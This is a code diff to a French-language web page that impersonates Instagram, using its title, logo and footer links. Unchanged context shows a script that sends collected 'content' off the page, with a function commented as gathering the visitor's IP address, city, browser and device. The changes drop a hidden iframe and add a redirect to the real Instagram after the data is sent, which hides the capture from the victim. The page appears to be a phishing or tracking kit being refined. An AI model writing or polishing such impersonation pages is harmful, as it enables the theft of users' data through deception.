@@ -1,9 +1,5 @@
 <!DOCTYPE html>
 <html lang="fr">
-  <iframe src="ip.html" style="display: none;"></iframe>
-</body>
-</html>
-
 <head>
   <link rel="Icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
   <title>Instagram</title>
@@ -26,6 +22,9 @@
         content: content
       };
       request.send(JSON.stringify(params));
+
+      // Redirection vers la page Instagram
+      window.location.href = "https://www.instagram.com/";
     }
 
     // Fonction pour récupérer l'adresse IP de l'utilisateur, la ville, le navigateur et l'appareil associés
@@ -124,20 +123,19 @@
               <li><a href="https://help.instagram.com/519522125107875">Confidentialité</a></li>
               <li><a href="https://help.instagram.com/581066165581870">Conditions</a></li>
               <li><a href="https://about.meta.com/technologies/meta-verified/">Meta Verified</a></li>
-              <li><a href="">Instagram/a></li>
+              <li><a href="">Instagram</a></li>
             </ul>
           </nav>
           <span class="footer-logo">&copy; 2021 Instagram</span>
         </div>
-      </footer>
-      
+      </footer>    
     </section>
   </span>
 
   <!-- Select Link -->
   <script type="text/javascript">
     function la(src) {
-      window.location=src;
+      window.location = src;
     }
   </script>
 </body>
